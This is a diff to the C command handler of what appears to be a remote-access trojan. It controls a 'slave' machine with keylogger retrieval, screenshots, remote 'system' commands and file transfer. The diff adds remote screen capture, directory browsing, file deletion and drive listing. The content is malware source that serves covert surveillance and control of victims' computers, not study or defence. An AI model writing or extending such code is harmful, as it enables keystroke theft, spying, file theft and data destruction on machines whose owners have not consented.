@@ -7,9 +7,10 @@
 #include "cmd/commands.h"
 #include "net/interface.h"
 #include "net/error.h"
+#include "cmd/hdd/path.h"
 
-int commands_cmdList_argsCount[COMMANDS_TOTAL_COMMANDS] = {  0,    1,       0,         0,         1,             1,                 0,                 0,             3,             2,           2 };
-char* commands_cmdList[COMMANDS_TOTAL_COMMANDS] =         { " ", "send ", "info", "terminate", "system ", "keylogger get ", "keylogger size", "keylogger clear", "screen get ", "file get ", "file send " };
+int commands_cmdList_argsCount[COMMANDS_TOTAL_COMMANDS] = {  0,    1,       0,         0,         1,             1,                 0,                 0,             3,             2,           2,             3,        1,     0,    1,        1,         0};
+char* commands_cmdList[COMMANDS_TOTAL_COMMANDS] =         { " ", "send ", "info", "terminate", "system ", "keylogger get ", "keylogger size", "keylogger clear", "screen get ", "file get ", "file send ", "screen cap ", "ls ", "ls", "cd ", "remove ", "disk list" };
 
 void commands_printHelp(void)
 {
@@ -24,8 +25,15 @@ void commands_printHelp(void)
 	LOG(LOG_INFO, "  keylogger size                  #gets keylogger data size\n");
 	LOG(LOG_INFO, "  keylogger clear                 #clears keylogger data\n");
 	LOG(LOG_INFO, "  screen get {W%%}, {H%%}, {DEST}   #get screenshot with size abjusts\n");
-	LOG(LOG_INFO, "  file get {SRC}, {DEST}          #retrieves file\n");
-	LOG(LOG_INFO, "  file send {DEST}, {SRC}         #sends file\n");
+	LOG(LOG_INFO, "  screen cap {W%%}, {H%%}, {MS}     #capture screen\n");
+	LOG(LOG_INFO, "  file get {SRC}, {DEST}          #retrieves file, only filenames for slave\n");
+	LOG(LOG_INFO, "  file send {DEST}, {SRC}         #sends file, only filenames for slave\n");
+	LOG(LOG_INFO, "  ls                              #display list of files and folders\n");
+	LOG(LOG_INFO, "  ls {PATH}                       #display list of files and folders\n");
+	LOG(LOG_INFO, "  cd {PATH}                       #navigate to path\n");
+	LOG(LOG_INFO, "  reset cd                        #resets path back to C:\\\n");
+	LOG(LOG_INFO, "  remove {PATH}                   #deletes file\n");
+	LOG(LOG_INFO, "  disk list                       #displays all mounted drives\n");
 }
 
 int commands_Equals(char* msg, int cmdId)
@@ -131,6 +139,13 @@ int commands_find(char* msg)
 		server_CloseConnection();
 
 		return NET_LOST_CONNECTION;
+	}else if(strcmp(msg, "reset cd") == 0){
+		hdd_Path_Inited = 1;
+		strcpy(hdd_Path, "C:\\");
+
+		LOG(LOG_INFO, "Path is reseted to %s\n", hdd_Path);
+
+		return COMMANDS_DONT_SEEDUP;
 	}else if(commands_Equals(msg, COMMANDS_SEND)){
 		if(!commands_FormatCmd(&msg, msgLen, COMMANDS_SEND))
 		{
@@ -181,6 +196,38 @@ int commands_find(char* msg)
 		}
 
 		return command_Send_File(msg, msgLen);
+	}else if(commands_Equals(msg, COMMANDS_SCREEN_CAPTURE)){
+		if(!commands_FormatCmd(&msg, msgLen, COMMANDS_SCREEN_CAPTURE))
+		{
+			return COMMANDS_UNKNOW_COMMAND;
+		}
+
+		return command_Screen_Capture(msg, msgLen);
+	}else if(commands_Equals(msg, COMMANDS_HDD_LS_ARG)){
+		if(!commands_FormatCmd(&msg, msgLen, COMMANDS_HDD_LS_ARG))
+		{
+			return COMMANDS_UNKNOW_COMMAND;
+		}
+
+		return command_hdd_Ls_Arg(msg, msgLen);
+	}else if(commands_Equals(msg, COMMANDS_HDD_LS)){
+		return command_hdd_Ls();
+	}else if(commands_Equals(msg, COMMANDS_HDD_CD)){
+		if(!commands_FormatCmd(&msg, msgLen, COMMANDS_HDD_CD))
+		{
+			return COMMANDS_UNKNOW_COMMAND;
+		}
+
+		return command_hdd_Cd(msg, msgLen);
+	}else if(commands_Equals(msg, COMMANDS_REMOVE)){
+		if(!commands_FormatCmd(&msg, msgLen, COMMANDS_REMOVE))
+		{
+			return COMMANDS_UNKNOW_COMMAND;
+		}
+
+		return command_Remove(msg, msgLen);
+	}else if(commands_Equals(msg, COMMANDS_DISK_LIST)){
+		return command_Disk_list();
 	}
 
 	return COMMANDS_UNKNOW_COMMAND;
